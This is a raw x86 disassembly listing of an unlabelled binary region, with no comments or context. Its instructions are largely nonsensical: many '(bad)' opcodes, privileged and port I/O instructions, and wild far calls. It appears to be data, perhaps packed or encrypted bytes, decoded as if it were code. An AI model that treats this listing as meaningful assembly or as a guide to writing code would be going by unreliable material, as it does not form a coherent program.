  4117ed:	call   0x5369:0xa5e78a9c
  4117f4:	xor    DWORD PTR [eax-0x10],eax
  4117f7:	xor    esi,edi
  4117f9:	das    
  4117fa:	or     bl,cl
  4117fc:	xchg   edi,eax
  4117fd:	dec    edx
  4117fe:	dec    esp
  411800:	xchg   ebx,eax
  411801:	ret    0x5f74
  411804:	aad    0xc0
  411806:	pop    es
  411807:	arpl   WORD PTR [edx+0x6bd46812],ax
  41180d:	inc    ebx
  41180e:	add    dh,bl
  411810:	add    eax,0xad14b42c
  411815:	aad    0x45
  411817:	pushf  
  411818:	sahf   
  411819:	loope  0x4117de
  41181b:	wbinvd 
  41181d:	mov    al,ds:0xae0564c2
  411822:	aas    
  411823:	ja     0x411829
  411825:	jmp    0x2bd17b2d
  41182a:	cwde   
  41182b:	and    al,0x9e
  41182d:	xor    edi,esp
  41182f:	test   al,ch
  411831:	inc    edx
  411832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411833:	or     ch,BYTE PTR gs:[ecx+0x13826530]
  41183a:	cwde   
  41183b:	push   esp
  41183c:	sbb    edi,esp
  41183e:	fmul   DWORD PTR [esp+ecx*8]
  411841:	stos   BYTE PTR es:[edi],al
  411842:	cld    
  411843:	inc    esp
  411844:	dec    esi
  411845:	sar    BYTE PTR [edx-0x6367f7b7],cl
  41184b:	mov    cl,0x4
  41184d:	sub    cl,bh
	...
  41185b:	add    BYTE PTR [eax],al
  41185d:	add    ah,ch
  41185f:	pop    ss
  411860:	pop    esi
  411861:	dec    esp
  411862:	loopne 0x411800
  411864:	out    0x2e,eax
  411866:	pop    bp
  411868:	call   0x6a467a70
  41186d:	stos   DWORD PTR es:[edi],eax
  41186e:	arpl   WORD PTR [ecx],bx
  411870:	out    dx,eax
  411871:	fadd   st,st(4)
  411873:	retf   
  411874:	sub    bh,ah
  411876:	cld    
  411877:	bound  edi,QWORD PTR [ebp+ebx*1+0x3f5c05a2]
  41187e:	push   DWORD PTR [esi+eiz*1]
  411881:	das    
  411882:	pop    ebx
  411883:	lods   eax,DWORD PTR ds:[esi]
  411884:	jmp    0x4118cf
  411886:	fcomp  QWORD PTR [ebp+0x1963ac69]
  41188c:	in     al,0x80
  41188e:	aam    0x2
  411890:	jl     0x41188f
  411892:	loope  0x4118b3
  411894:	or     eax,0x73604
  411899:	ret    0xcca0
  41189c:	shl    ecx,0x60
  41189f:	nop
  4118a0:	inc    esp
  4118a1:	aad    0x10
  4118a3:	sahf   
  4118a4:	je     0x411897
  4118a6:	clc    
  4118a7:	stos   BYTE PTR es:[edi],al
  4118a8:	pop    eax
  4118a9:	(bad)  
  4118aa:	mov    edi,0x3ce8f782
  4118af:	or     BYTE PTR [ebx+0x61862c1],al
  4118b5:	push   0x45
  4118b7:	mov    cl,0xff
  4118b9:	cmp    esi,DWORD PTR [ebp-0x16]
  4118bc:	mov    edi,0x5a2a0
  4118c1:	je     0x4118c3
	...
  4118cf:	add    BYTE PTR [eax],al
  4118d1:	and    eax,0x8d9e4fb1
  4118d6:	or     eax,0x9ca9a0e8
  4118db:	(bad)  
  4118dc:	loop   0x4118fe
  4118de:	adc    al,BYTE PTR [esi]
  4118e0:	push   0x7d
  4118e2:	test   eax,0xf03ef3ff
  4118e7:	mov    edi,0x522a0
  4118ec:	pop    esp
  4118ed:	ins    DWORD PTR es:[edi],dx
  4118ee:	test   eax,0xd75664f
  4118f3:	call   0xfeddc284
  4118f8:	push   0xffffffc8
  4118fa:	fdiv   QWORD PTR [edi+eiz*8-0x1d]
  4118fe:	sbb    esp,ebp
  411900:	jmp    0x296c1c3a
  411905:	mov    ecx,0x6de907c6
  41190a:	inc    ecx
  41190b:	in     al,dx
  41190c:	cdq    
  41190d:	(bad)  
  41190e:	adc    DWORD PTR [eax],ecx
  411910:	adc    eax,edx
  411912:	cmp    eax,0x94e31eff
  411917:	pop    ds
  411918:	pushf  
  411919:	(bad)  
  41191a:	xchg   DWORD PTR [ebp+edi*8+0x61],edi
  41191e:	adc    al,BYTE PTR [esi]
  411920:	add    BYTE PTR [ecx-0x4d3d3838],dh
  411926:	or     BYTE PTR [ebp-0xc7a1bb],cl
  41192c:	jne    0x4118f0
  41192e:	xor    BYTE PTR [ecx+0x59],0xbd
  411932:	push   0xf881
	...
  411943:	add    BYTE PTR [edx-0x2],ch
  411946:	add    eax,0xfe552f83
  41194b:	je     0x4118d1
  41194d:	stos   DWORD PTR es:[edi],eax
  41194e:	mov    esi,0x9b8c9
  411953:	lea    eax,[edi+0x55]
  411956:	dec    esi
  411957:	push   0x6a
  411959:	push   0xe8a20873
  41195e:	pop    eax
  41195f:	(bad)  
  411960:	mov    ebp,0x9aec4376
  411965:	push   0x57e20873
  41196a:	push   esi
  41196b:	(bad)  
  41196c:	fld    QWORD PTR [ebx+0xb4801f6]
  411972:	cmp    eax,0x49
  411975:	inc    DWORD PTR ds:0xfe6c2f83
  41197b:	je     0x4119c1
  41197d:	stos   DWORD PTR es:[edi],eax
  41197e:	mov    esi,0x978c9
  411983:	mov    ds:0x40ee02,eax
  411988:	jg     0x4119d8
  41198a:	in     al,dx
  41198b:	push   eax
  41198c:	and    BYTE PTR [eax+0x701275fd],dh
  411992:	dec    eax
  411993:	pop    ecx
  411994:	cmp    eax,0x75c56668
  411999:	inc    ecx
  41199a:	add    BYTE PTR [ebp+0x6a4e6bc7],cl
  4119a0:	sti    
  4119a1:	data16 jae 0x4119b0
  4119a4:	jge    0x4119a4
  4119a6:	pop    es
  4119a7:	call   0x4119ac
	...
  4119b4:	add    BYTE PTR [eax],al
  4119b6:	add    BYTE PTR [ebx-0x7e],ah
  4119b9:	cwde   
  4119ba:	dec    ah
  4119bc:	in     al,0xc5
  4119be:	pop    es
  4119bf:	arpl   WORD PTR [ecx-0x73],di
  4119c2:	jmp    0x4119a4
  4119c4:	loope  0x411965
  4119c6:	mov    WORD PTR [esi],ds
  4119c8:	xchg   edx,eax
  4119c9:	xor    ch,al
  4119cb:	cmp    dh,BYTE PTR [ecx-0x5f]
  4119ce:	(bad)  
  4119cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119d0:	cmp    BYTE PTR [eax-0x5555e902],ah
  4119d6:	dec    esi
  4119d7:	sub    al,0xb3
  4119d9:	mov    eax,ds:0x1331a30a
  4119de:	dec    DWORD PTR [esi]
  4119e0:	xchg   esi,eax
  4119e1:	mov    eax,ds:0xddb57f74
  4119e6:	std    
  4119e7:	je     0x411a3b
  4119e9:	or     eax,0xa1adf6c0
  4119ee:	je     0x411a57
  4119f0:	jne    0x411a14
  4119f2:	push   ebp
  4119f3:	pop    esp
  4119f4:	jl     0x4119c1
  4119f6:	shl    DWORD PTR [edi-0x54],0x37
  4119fa:	mov    edi,DWORD PTR [edi]
  4119fc:	mov    WORD PTR [edi],ss
  4119fe:	or     al,0x3b
  411a00:	pusha  
  411a01:	and    al,0xff
  411a03:	cmp    al,0x98
  411a05:	ret    0x8073
  411a08:	adc    ebx,DWORD PTR [eax]
  411a0a:	adc    BYTE PTR [ebx+0x2460cc84],dl
  411a10:	and    al,0x33
  411a12:	push   0x4266eb
  411a17:	adc    al,0xba
  411a19:	cli    
  411a1a:	inc    BYTE PTR [eax]
	...
  411a28:	add    BYTE PTR [eax],al
  411a2a:	xchg   esi,eax
  411a2b:	nop
  411a2c:	xor    bh,bh
  411a2e:	mov    ss,WORD PTR [edx+ebp*4-0x5e241c1b]
  411a35:	out    0xb6,eax
  411a37:	jno    0x4119da
  411a39:	(bad)  
  411a3a:	sbb    ch,bh
  411a3c:	idiv   bh
  411a3e:	pop    DWORD PTR ds:0x544af72
  411a44:	jmp    0x626f30fb
  411a49:	inc    esi
  411a4a:	and    al,BYTE PTR ds:0x2f57180e
  411a50:	jecxz  0x4119f4
  411a52:	aaa    
  411a53:	or     eax,0x9ab55311
  411a58:	cmc    
  411a59:	sub    ah,BYTE PTR [ebx+0x5]
  411a5c:	(bad)  
  411a5d:	pusha  
  411a5e:	cmp    al,0x71
  411a60:	sub    DWORD PTR [ebx+0x63],eax
  411a63:	call   0x17d5:0xff091053
  411a6a:	pop    ebx
  411a6b:	lods   eax,DWORD PTR ds:[esi]
  411a6c:	outs   dx,DWORD PTR ds:[esi]
  411a6d:	mov    eax,ds:0x4509a85
  411a72:	arpl   WORD PTR [edx+0x46e82c7e],bp
  411a78:	sub    BYTE PTR [esp+ebp*2],al
  411a7b:	adc    ch,bl
  411a7d:	sub    eax,0xc1b9a47
  411a82:	dec    ebx
  411a83:	xchg   DWORD PTR [ebp-0x16d2aa5f],ebx
  411a89:	add    edi,DWORD PTR [ebx+ebx*2]
  411a8c:	add    BYTE PTR [eax+0x0],bh
	...
  411a9b:	add    BYTE PTR [eax],al
  411a9d:	mov    eax,ds:0xb7a0e944
  411aa2:	or     DWORD PTR [ebx],edx
  411aa4:	add    BYTE PTR [eax+edx*1],dh
  411aa7:	loope  0x411a54
  411aa9:	mov    ecx,0xbca16d9a
  411aae:	add    eax,0x2cdeb0e9
  411ab3:	jb     0x411afa
  411ab5:	mov    ds:0x5f175605,al
  411aba:	das    
  411abb:	or     ah,BYTE PTR [ecx+0x38510d8f]
  411ac1:	cld    
  411ac2:	cdq    
  411ac3:	cmp    eax,0x5632c
  411ac8:	inc    esi
  411ac9:	and    DWORD PTR [edx],0x5a1aa94
  411acf:	call   FWORD PTR [esp+ebp*2+0x6c1e232f]
  411ad6:	or     eax,0x9b03d4e8
  411adb:	(bad)  
  411adc:	and    BYTE PTR [ebp-0x1063ffff],bl
  411ae2:	lods   eax,DWORD PTR ds:[esi]
  411ae3:	and    BYTE PTR ds:0x83002c03,0x96
  411aea:	call   0xe65a:0x47f8e174
  411af1:	ret    
  411af2:	mov    WORD PTR [ebp+ebx*8+0x48],es
  411af6:	jmp    0x9aa8433e
  411afb:	je     0x411ade
  411afd:	mov    eax,0xc6ff48
	...
  411b0e:	add    BYTE PTR [eax],al
  411b10:	ret    
  411b11:	call   0xc108:0x10c3bd74
  411b18:	dec    ecx
  411b19:	aas    
  411b1a:	jmp    FWORD PTR [esi-0x16fc3c67]
  411b20:	xchg   ebp,eax
  411b21:	mov    ebx,gs
  411b23:	push   0x1c
  411b25:	popf   
  411b26:	imul   ebp,ecx,0x14fed47e
  411b2c:	push   edi
  411b2d:	lods   eax,DWORD PTR ds:[esi]
  411b2e:	sbb    al,0x23
  411b30:	add    bl,BYTE PTR [eax+0x21032488]
  411b36:	cmp    ebp,DWORD PTR ds:0xf4ff05a0
  411b3c:	pop    eax
  411b3d:	lods   eax,DWORD PTR ds:[esi]
  411b3e:	sbb    esp,DWORD PTR [esi-0x3d]
  411b41:	xchg   edi,eax
  411b42:	(bad)  
  411b43:	aam    0xf4
  411b45:	xchg   edi,eax
  411b46:	je     0x411b29
  411b48:	mov    eax,0xc34e5a40
  411b4d:	int    0xc1
  411b4f:	add    BYTE PTR [esi],cl
  411b51:	add    eax,0x81a68b55
  411b56:	ret    0x20f8
  411b59:	add    eax,0xef35346a
  411b5e:	pop    es
  411b5f:	call   0x3ff6da
  411b64:	push   ebx
  411b65:	aas    
  411b66:	cld    
  411b67:	push   0x4140ff
  411b6c:	push   ebp
  411b6d:	out    dx,eax
  411b6e:	pop    es
  411b6f:	call   0x3e81c5
	...
  411b80:	add    BYTE PTR [eax],al
  411b82:	add    al,dl
  411b84:	add    al,0x68
  411b86:	inc    BYTE PTR gs:[ebx+0x0]
  411b8a:	push   0x4140cb
  411b8f:	test   DWORD PTR [esi+0x14b2925],edi
  411b95:	call   0xfdb9713f
  411b9a:	or     edi,DWORD PTR [edx+0x4f893efd]
  411ba0:	jns    0x411c08
  411ba2:	mov    al,ah
  411ba4:	inc    ecx
  411ba5:	add    BYTE PTR [eax+0x7a],ch
  411ba8:	add    al,0xef
  411baa:	mov    esi,0x41418c22
  411baf:	dec    edx
  411bb0:	ja     0x411c25
  411bb2:	clc    
  411bb3:	cmc    
  411bb4:	std    
  411bb5:	pop    es
  411bb6:	call   0x401485
  411bbb:	bound  ecx,QWORD PTR [ecx-0x13b5bf48]
  411bc1:	(bad)  
  411bc2:	jmp    ebp
  411bc4:	ss addr16 xchg esp,eax
  411bc7:	jns    0x411c0b
  411bc9:	add    bh,bh
  411bcb:	das    
  411bcc:	jl     0x411bcb
  411bce:	jne    0x411be2
  411bd0:	ins    BYTE PTR es:[edi],dx
  411bd1:	je     0x411c52
  411bd3:	mov    ch,0x78
  411bd5:	std    
  411bd6:	jne    0x411c3b
  411bd8:	lods   al,BYTE PTR ss:[esi]
  411bda:	dec    ecx
  411bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bdc:	inc    edi
  411bdd:	lahf   
  411bde:	(bad)  
  411bdf:	jbe    0x411c23
  411be1:	lahf   
  411be2:	je     0x411c4f
  411be4:	ss popa 
  411be6:	pop    eax
	...
  411bf3:	add    BYTE PTR [eax],al
  411bf5:	add    ah,ch
  411bf7:	into   
  411bf8:	int3   
  411bf9:	rcr    DWORD PTR [edi-0x52],0x37
  411bfd:	mov    ecx,edi
  411bff:	sub    cl,al
  411c01:	sti    
  411c02:	dec    ecx
  411c03:	scas   al,BYTE PTR es:[edi]
  411c04:	sub    BYTE PTR ds:0xe80a78cc,dh
  411c0a:	inc    edx
  411c0b:	push   ebp
  411c0c:	popf   
  411c0d:	(bad)  
  411c0e:	jmp    0x4362:0x32679e68
  411c15:	add    BYTE PTR [eax+ebx*1-0x57bc17f5],ch
  411c1c:	popf   
  411c1d:	(bad)  
  411c1e:	pushf  
  411c1f:	cmp    BYTE PTR [eax-0x5569f102],ah
  411c25:	mov    ebp,DWORD PTR [edx]
  411c27:	scas   eax,DWORD PTR es:[edi]
  411c28:	popf   
  411c29:	enter  0xa1a1,0x2
  411c2d:	push   ebp
  411c2e:	call   0x78049de4
  411c33:	xor    eax,DWORD PTR [edx+ebp*2]
  411c36:	xor    eax,0x7b08174f
  411c3b:	popf   
  411c3c:	cmp    edi,edi
  411c3e:	pop    esp
  411c3f:	push   ss
  411c40:	dec    eax
  411c41:	cld    
  411c42:	retf   
  411c43:	loop   0x411c8c
  411c45:	inc    ecx
  411c46:	arpl   WORD PTR [edi+0x17],bp
  411c49:	or     BYTE PTR [ebx],bh
  411c4b:	pop    eax
  411c4c:	pushf  
  411c4d:	(bad)  
  411c4e:	cmp    al,0x80
  411c50:	pop    ss
  411c51:	cld    
  411c52:	xor    al,0x92
  411c54:	or     ch,al
  411c56:	mov    ch,dh
  411c58:	sahf   
  411c59:	inc    BYTE PTR [eax]
	...
  411c67:	add    BYTE PTR [eax],al
  411c69:	sbb    ch,BYTE PTR [ebx+0x6]
  411c6c:	add    BYTE PTR [esi-0x1e508dfb],dh
  411c72:	rcr    DWORD PTR [ecx+ebp*1+0x63],0x2b
  411c77:	push   ds
  411c78:	lahf   
  411c79:	(bad)  
  411c7a:	or     eax,0x96949e41
  411c7f:	inc    ebp
  411c80:	mov    WORD PTR [edi-0x5f782f67],ds
  411c86:	inc    esp
  411c87:	jmp    0x414e8c2a
  411c8c:	popf   
  411c8d:	fist   WORD PTR [esi-0x66b061db]
  411c93:	sbb    eax,0xc2ad5b18
  411c98:	cmp    al,0xc4
  411c9a:	xchg   esi,eax
  411c9b:	pop    ds
  411c9c:	shl    DWORD PTR [eax+0x5],0x9c
  411ca0:	mov    cl,al
  411ca2:	and    BYTE PTR [edi+ebx*4],0x3a
  411ca6:	add    eax,0x10a5db83
  411cab:	loope  0x411c58
  411cad:	scas   al,BYTE PTR es:[edi]
  411cae:	cmp    eax,0x40eb9de6
  411cb3:	(bad)  [edi+ebx*8]
  411cb6:	inc    ecx
  411cb7:	sub    BYTE PTR [esp+eax*4],al
  411cba:	adc    cl,ah
  411cbc:	stos   DWORD PTR es:[edi],eax
  411cbd:	scas   eax,DWORD PTR es:[edi]
  411cbe:	cwde   
  411cbf:	lds    ebx,FWORD PTR [ebp-0x6242ef8b]
  411cc5:	test   DWORD PTR [ecx+eax*8],0xad960c9b
  411ccc:	retf   
	...
  411cd9:	add    BYTE PTR [eax],al
  411cdb:	add    BYTE PTR [edx],ah
  411cdd:	add    ecx,ebp
  411cdf:	ss call 0x5f58ba8d
  411ce5:	lods   eax,DWORD PTR ds:[esi]
  411ce6:	push   ecx
  411ce7:	cmp    eax,0xc3e19644
  411cec:	mov    al,0xf8
  411cee:	adc    BYTE PTR [ebp-0x60],bh
  411cf1:	inc    esp
  411cf2:	jmp    0x76582a
  411cf7:	push   ss
  411cf8:	(bad)  
  411cf9:	xchg   esi,eax
  411cfa:	dec    edi
  411cfb:	outs   dx,BYTE PTR ds:[esi]
  411cfc:	je     0x411cf3
  411cfe:	dec    edi
  411cff:	data16 ins BYTE PTR es:[edi],dx
  411d01:	or     eax,0x96d556e8
  411d06:	inc    BYTE PTR [ecx-0x66]
  411d09:	cmp    bh,bh
  411d0b:	dec    esi
  411d0c:	sub    ah,al
  411d0e:	or     ebp,ecx
  411d10:	sub    eax,0x1b6aeb8a
  411d15:	mov    ss,WORD PTR [esi-0x3d]
  411d18:	pusha  
  411d19:	sub    edi,DWORD PTR [ecx]
  411d1b:	cs je  0x411d2b
  411d1e:	call   0xfed7b5b8
  411d23:	jo     0x411d49
  411d25:	cdq    
  411d26:	mov    dl,ah
  411d28:	and    ch,ch
  411d2a:	inc    eax
  411d2b:	jmp    0x7d40f410
  411d30:	push   esp
  411d31:	sub    eax,0x521a596
  411d36:	push   edi
  411d37:	add    DWORD PTR [esi],ecx
  411d39:	jmp    0xc5ad063d
  411d3e:	jae    0x411d86
	...
  411d4c:	add    BYTE PTR [eax],al
  411d4e:	add    BYTE PTR [esi-0x53],cl
  411d51:	fld    DWORD PTR [ebp-0x12]
  411d54:	xchg   esi,eax
  411d55:	or     ch,BYTE PTR [ecx+0x2489306c]
  411d5b:	fist   WORD PTR [esi-0x4b53e8c]
  411d61:	(bad)  
  411d62:	xor    al,0x5f
  411d64:	lods   eax,DWORD PTR ds:[esi]
  411d65:	test   DWORD PTR [esi+0x34fe96c7],esi
  411d6b:	call   FWORD PTR [esi]
  411d6d:	sbb    al,0xa6
  411d6f:	ins    DWORD PTR es:[edi],dx
  411d70:	std    
  411d71:	out    0x20,eax
  411d73:	out    dx,al
  411d74:	xchg   ebx,eax
  411d75:	(bad)  
  411d76:	xchg   esi,eax
  411d77:	ins    DWORD PTR es:[edi],dx
  411d78:	lea    ebp,[ecx-0x36]
  411d7b:	fistp  WORD PTR [ecx]
  411d7d:	or     BYTE PTR [eax],al
  411d7f:	shl    ah,cl
  411d81:	(bad)  
  411d82:	jmp    FWORD PTR [ebp+0x7b44a8e0]
  411d88:	or     edi,edi
  411d8a:	jne    0x411d1e
  411d8c:	pusha  
  411d8d:	jae    0x411ded
  411d8f:	jge    0x411e02
  411d91:	or     eax,eax
  411d93:	ss xchg edi,eax
  411d95:	dec    esi
  411d96:	jmp    DWORD PTR [edi]
  411d98:	jno    0x411de8
  411d9a:	call   DWORD PTR [edi]
  411d9c:	add    eax,ebp
  411d9e:	ins    BYTE PTR es:[edi],dx
  411d9f:	push   esp
  411da0:	jno    0x411d9f
  411da2:	call   0x3febe1
  411da7:	sub    eax,0x52e8f7fb
  411dac:	into   
  411dad:	(bad)  
  411dae:	(bad)  
  411daf:	jle    0x411d66
  411db1:	mov    esi,0xb9
	...
  411dc2:	ins    DWORD PTR es:[edi],dx
  411dc3:	jno    0x411dc2
  411dc5:	jmp    FWORD PTR [eax+0x22]
  411dc8:	aaa    
  411dc9:	pop    es
  411dca:	xlat   BYTE PTR ds:[ebx]
  411dcb:	mov    ebp,?
  411dcd:	jne    0x411e2d
  411dcf:	jno    0x411e44
  411dd1:	or     BYTE PTR [edx-0x6d],dl
  411dd4:	push   esi
  411dd5:	jmp    FWORD PTR [ebp-0x793d3730]
  411ddb:	or     BYTE PTR [ebp-0x75],dl
  411dde:	scas   al,BYTE PTR es:[edi]
  411ddf:	jo     0x411e54
  411de1:	or     al,0xb2
  411de3:	dec    edi
  411de4:	pop    esp
  411de5:	jmp    FWORD PTR [ebp-0x708b3ffc]
  411deb:	loopne 0x411da4
  411ded:	inc    esp
  411dee:	dec    ebx
  411def:	or     DWORD PTR [eax-0x18],edx
  411df2:	sub    edi,ecx
  411df4:	(bad)  
  411df5:	dec    DWORD PTR [edx+0x70]
  411df8:	jae    0x411e0a
  411dfa:	jp     0x411e6c
  411dfc:	jae    0x411e06
  411dfe:	repnz xchg edx,eax
  411e00:	aam    0xff
  411e02:	in     eax,dx
  411e03:	pusha  
  411e04:	ins    BYTE PTR es:[edi],dx
  411e05:	pop    edx
  411e06:	arpl   WORD PTR [ebx-0x66],di
  411e09:	enter  0xb221,0x2
  411e0d:	push   ebp
  411e0e:	call   0x2c04a48c
  411e13:	sti    
  411e14:	sub    eax,0x9958b900
  411e19:	je     0x411e86
  411e1b:	xchg   BYTE PTR [edx-0x72d4ebaa],cl
  411e21:	inc    esp
  411e22:	(bad)  
  411e24:	fnstcw WORD PTR [edi]
	...
  411e32:	add    BYTE PTR [eax],al
  411e34:	add    BYTE PTR [ebx],bh
  411e36:	pop    ebp
  411e37:	add    al,BYTE PTR [eax+0x590e9e3c]
  411e3d:	mov    ecx,DWORD PTR [edi]
  411e3f:	inc    eax
  411e40:	inc    ecx
  411e41:	arpl   WORD PTR [ebx-0x56],di
  411e44:	fnstenv [edi]
  411e46:	sahf   
  411e47:	add    cl,BYTE PTR [ebx]
  411e49:	mov    ds:0xcb56d659,eax
  411e4e:	call   0x970e1d79
  411e53:	ret    0x9173
  411e56:	and    eax,0x78bcf841
  411e5b:	call   0xbb08:0x110b5969
  411e62:	sub    ebx,DWORD PTR [ebx+0xf9aa4fe]
  411e68:	clc    
  411e69:	or     edx,eax
  411e6b:	cdq    
  411e6c:	je     0x411ed9
  411e6e:	mov    dh,0x1b
  411e70:	dec    DWORD PTR [edx+esi*4+0x478b7499]
  411e77:	out    0xfe,eax
  411e79:	mul    BYTE PTR [ebp-0x358b9456]
  411e7f:	cdq    
  411e80:	(bad)  
  411e81:	test   ch,0xaa
  411e84:	std    
  411e85:	or     bl,BYTE PTR [ebx-0x67]
  411e88:	sti    
  411e89:	nop
  411e8a:	pop    esp
  411e8b:	pop    ebx
  411e8c:	(bad)  
  411e8d:	push   esp
  411e8e:	push   es
  411e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e90:	call   0x6ace:0x2e06452
  411e97:	xchg   ebp,eax
  411e98:	adc    BYTE PTR [eax],al
	...
  411ea6:	add    BYTE PTR [eax],al
  411ea8:	aas    
  411ea9:	xchg   ebx,eax
  411eaa:	adc    ecx,DWORD PTR [ebx+ecx*2]
  411ead:	daa    
  411eae:	push   ds
  411eaf:	fwait
  411eb0:	sub    eax,0x60c5b033
  411eb5:	add    eax,0x87088f1c
  411eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ebb:	xchg   edi,eax
  411ebc:	lods   eax,DWORD PTR ds:[esi]
  411ebd:	pop    ds
  411ebe:	jmp    0xd3d366f0
  411ec3:	or     edi,ebx
  411ec5:	or     BYTE PTR [esi-0x5c830266],bh
  411ecb:	xchg   edi,eax
  411ecc:	jmp    0xa42cc7a1
  411ed1:	add    eax,0x16e4da69
  411ed6:	test   eax,0xa849a02b
  411edb:	add    ebp,DWORD PTR [ebx*4-0x6d331848]
  411ee2:	icebp  
  411ee3:	ret    
  411ee4:	push   eax
  411ee5:	out    0xbd,al
  411ee7:	stos   DWORD PTR es:[edi],eax
  411ee8:	xor    DWORD PTR [esi],esp
  411eea:	push   cs
  411eeb:	call   0x1d1c:0xfc7cc569
  411ef2:	jmp    0x8094d2fa
  411ef7:	enter  0x4420,0xe9
  411efb:	xor    edx,DWORD PTR [eax+ebx*1+0x1303abf1]
  411f02:	ficomp WORD PTR [ecx-0x66d07f84]
  411f08:	jge    0x411e9b
  411f0a:	sbb    esp,eax
	...
  411f18:	add    BYTE PTR [eax],al
  411f1a:	add    BYTE PTR [ebx+0x6d99c592],bh
  411f20:	xchg   edi,eax
  411f21:	mov    ds,esp
  411f23:	pop    ebp
  411f24:	sbb    BYTE PTR [eax],al
  411f26:	test   eax,0xaefc18fa
  411f2b:	fs std 
  411f2d:	out    0x9b,eax
  411f2f:	xchg   ecx,eax
  411f30:	xchg   edx,eax
  411f31:	(bad)  
  411f32:	ds sbb ah,al
  411f35:	add    ebp,ecx
  411f37:	lea    edi,[esi-0x15]
  411f3a:	push   0x23
  411f3c:	stos   BYTE PTR es:[edi],al
  411f3d:	add    ah,0xad
  411f40:	loopne 0x411f82
  411f42:	jmp    0xa04537a7
  411f47:	and    eax,0x5f02fffe
  411f4c:	pop    ds
  411f4d:	add    bl,dl
  411f4f:	jmp    0x411ee3
  411f51:	je     0x411f40
  411f53:	ss add eax,0xe7c8e96a
  411f59:	sub    ch,cl
  411f5b:	pusha  
  411f5c:	jl     0x411fa2
  411f5e:	inc    ecx
  411f5f:	retf   0xf818
  411f62:	push   ecx
  411f63:	xor    DWORD PTR [edi+edi*8],ebp
  411f66:	ss call 0x64701bb4
  411f6c:	(bad)  
  411f6d:	(bad)  
  411f6e:	pushf  
  411f6f:	hlt    
  411f70:	sbb    edi,edi
  411f72:	push   ds
  411f73:	push   esp
  411f74:	add    DWORD PTR [edx-0x17],ebp
  411f77:	mov    es,WORD PTR ds:0x91c7e5e8
  411f7d:	(bad)  
  411f7e:	je     0x411f80
	...
  411f8c:	add    BYTE PTR [eax],al
  411f8e:	ins    BYTE PTR es:[edi],dx
  411f8f:	cdq    
  411f90:	dec    edi
  411f91:	xchg   ebx,eax
  411f92:	pusha  
  411f93:	pop    ds
  411f94:	add    BYTE PTR [ebx-0x11ffe46a],al
  411f9a:	gs xchg ecx,eax
  411f9c:	(bad)  
  411f9d:	cld    
  411f9e:	or     eax,0x5e940e0
  411fa3:	push   edx
  411fa4:	push   cs
  411fa5:	popa   
  411fa6:	call   0xe82b1e3c
  411fab:	cmp    ah,dh
  411fad:	add    cl,dh
  411faf:	xchg   edi,eax
  411fb0:	mov    eax,DWORD PTR [ebp-0x56]
  411fb3:	aad    0x69
  411fb5:	add    BYTE PTR [eax-0x5dff9769],ah
  411fbb:	ja     0x411fff
  411fbd:	inc    ecx
  411fbe:	cmp    ch,BYTE PTR [esi+0x73]
  411fc1:	hlt    
  411fc2:	in     eax,0xda
  411fc4:	jne    0xffa00cd4
  411fca:	dec    edi
  411fcb:	jns    0x411fb3
  411fcd:	stos   DWORD PTR es:[edi],eax
  411fce:	dec    edx
  411fcf:	outs   dx,BYTE PTR ds:[esi]
  411fd0:	std    
  411fd1:	mov    DWORD PTR [edi+0x61],edi
  411fd4:	or     eax,eax
  411fd6:	push   ds
  411fd7:	cmp    eax,0x5ce275ff
  411fdc:	jmp    0x412036
  411fde:	test   DWORD PTR [ebp-0x79],ebp
  411fe1:	inc    ebp
  411fe2:	xchg   esi,eax
  411fe3:	ins    DWORD PTR es:[edi],dx
  411fe4:	jae    0x411fd6
  411fe6:	mov    ds:0xa5ff513a,al
  411feb:	ins    DWORD PTR es:[edi],dx
  411fec:	jae    0x411fd6
  411fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fef:	(bad)  
  411ff0:	jmp    0x411ff1
	...
  411ffe:	add    BYTE PTR [eax],al
  412000:	add    BYTE PTR [edi-0x4d3198c],ch
  412006:	ins    DWORD PTR es:[edi],dx
  412007:	std    
  412008:	or     ecx,DWORD PTR [edx-0x4597e500]
  41200e:	add    al,0xef
  412010:	mov    esi,0xe807ff65
  412015:	lahf   
  412016:	(bad)  
  412018:	jmp    DWORD PTR [ebp-0x1]
  41201b:	out    0xff,eax
  41201d:	das    
  41201e:	push   0x5cb275fd
  412023:	pop    ebx
  412024:	push   ebp
  412025:	xchg   ebp,eax
  412026:	js     0x412025
  412028:	jne    0x411fc0
  41202a:	pop    ebx
  41202b:	xchg   esp,eax
  41202c:	pop    eax
  41202d:	test   DWORD PTR [eax-0x3],edi
  412030:	jne    0x411fdc
  412032:	popa   
  412033:	stc    
  412034:	dec    edi
  412035:	arpl   WORD PTR [edi-0x45f1756a],si
  41203b:	mov    dl,BYTE PTR [ecx]
  41203d:	ins    BYTE PTR es:[edi],dx
  41203e:	ror    DWORD PTR [edi-0x6a69ee02],1
  412044:	je     0x4120a5
  412046:	(bad)  
  412047:	sbb    bl,BYTE PTR [eax+0x54]
  41204a:	pop    edi
  41204b:	int3   
  41204c:	rcr    DWORD PTR [edi-0x62],0x2f
  412050:	mov    esi,DWORD PTR [edi]
  412052:	outs   dx,DWORD PTR ds:[esi]
  412053:	adc    BYTE PTR [ebx+ecx*2],cl
  412056:	xor    edi,DWORD PTR [eax]
  412058:	push   DWORD PTR [ebx+eiz*4]
  41205b:	ret    0x7a73
  41205e:	imul   BYTE PTR [esi+0x329ea243]
  412064:	call   0x412069
	...
  412071:	add    BYTE PTR [eax],al
  412073:	add    BYTE PTR [ebx-0x4c016906],dh
  412079:	push   es
  41207a:	inc    ebp
  41207b:	mov    edi,0x2a9ea3
  412080:	arpl   WORD PTR [edi],di
  412082:	push   esi
  412083:	addr16 push cs
  412085:	bound  eax,QWORD PTR [ebx+0x0]
  412088:	xchg   ebx,eax
  412089:	aas    
  41208a:	adc    DWORD PTR [eax],ecx
  41208c:	sti    
  41208d:	mov    ch,0x19
  41208f:	jmp    esp
  412091:	xor    eax,0xd6dc57d7
  412096:	xchg   esi,eax
  412097:	je     0x412100
  412099:	inc    esi
  41209a:	jle    0x4120f7
  41209c:	int3   
  41209d:	out    0xa,al
  41209f:	ror    BYTE PTR [edi-0x4b],0x2a
  4120a3:	fisub  WORD PTR [edi]
  4120a5:	pop    ebp
